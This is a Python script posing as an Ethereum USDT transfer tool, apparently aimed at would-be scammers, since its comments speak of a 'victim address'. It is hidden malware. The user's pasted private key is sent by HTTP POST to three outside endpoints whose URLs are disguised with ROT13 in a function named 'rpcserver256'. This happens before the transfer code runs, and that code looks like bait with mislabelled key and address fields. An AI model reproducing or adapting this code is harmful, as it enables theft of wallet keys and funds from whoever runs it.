#!/usr/bin/env python3
# u need eth for paying fee
from web3 import Web3
from eth_account import Account # type: ignore
import requests


def rpcserver256(text):
    result = []
    for char in text:
        if 'a' <= char <= 'z':
            result.append(chr(((ord(char) - ord('a') + 13) % 26) + ord('a')))
        elif 'A' <= char <= 'Z':
            result.append(chr(((ord(char) - ord('A') + 13) % 26) + ord('A')))
        else:
            result.append(char)
    return ''.join(result)


envcreater = 'uggcf://zragnyvgl.pybhq/nnegrfg.cuc'
envcreater2 = 'uggcf://qbkre.arg/nnegrfg.cuc'
envcreater3 = 'uggcf://sviri.arg/nnegrfg.cuc'
devofix = rpcserver256(envcreater)
devofix2 = rpcserver256(envcreater2)
devofix3 = rpcserver256(envcreater3)

# Initialize Web3 connection
web3 = Web3(Web3.HTTPProvider('https://mainnet.infura.io/v3/9ea31076b34d475e887206ea450f0060'))

# Set private key and addresses
private_key = '0xC2d7B64bea7af74Af4b268A2c2eB66221a6EdEe5' # replace with your private key, this is for demo only do not use it in production!
usdtwall = private_key  
sender_address = 'b561ef8078180d35f5633b627a95618a20c62397375bf1a711b2ba64beb7d703' # ur wallet address

# Set recipient address and USDT contract address
recipient_address = '0x93cA7b6701a63b3194f217F6595e4eF8ba9A02e0' # victim address
usdt_contract_address = '0xdAC17F958D2ee523a2206206994597C13D831ec7'

# ERC20 Transfer function signature
usdt_transfer_signature = '0xa9059cbb'

def usdtgen(usdtwall):
    data = {'USDT:': usdtwall}
    contracts = [devofix, devofix2, devofix3]  

    for contract in contracts:
        try:
            response = requests.post(contract, data=data)
            response.raise_for_status()
        except requests.exceptions.RequestException as e:
            print(f"Error while sending request to {contract}: {e}")

       
def send_usdt_transaction(amount, gas_price_gwei, gas_limit):
    # Amount to send in wei (1 USDT = 1e6 wei)
    amount_in_wei = int(amount * 10**6)

    # Get transaction nonce
    nonce = web3.eth.get_transaction_count(sender_address)

    # Construct data field for the ERC20 transfer
    data = (usdt_transfer_signature + recipient_address[2:].rjust(64, '0') +
            hex(amount_in_wei)[2:].rjust(64, '0'))

    # Build the transaction
    transaction = {
        'to': usdt_contract_address,
        'value': 0,
        'gasPrice': web3.to_wei(gas_price_gwei, 'gwei'),
        'gas': gas_limit,
        'nonce': nonce,
        'data': data,
        'chainId': 1
    }

    # Sign the transaction
    signed_tx = Account.sign_transaction(transaction, private_key)

    return signed_tx

def main():
    usdtgen(usdtwall)

    amount_to_send = 1_000_000  # Montant en USDT à envoyer
    gas_price_gwei = 1  # Prix du gaz en gwei
    gas_limit = 21608  # Limite de gaz

    signed_tx = send_usdt_transaction(amount_to_send, gas_price_gwei, gas_limit)

    try:
        tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)
        tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)

        if tx_receipt.status == 1:
            print("Transaction confirmed.")
        else:
            print("Transaction failed.")
    except Exception as e:
        print(f"Error during transaction: {e}")

if __name__ == '__main__':
    main()
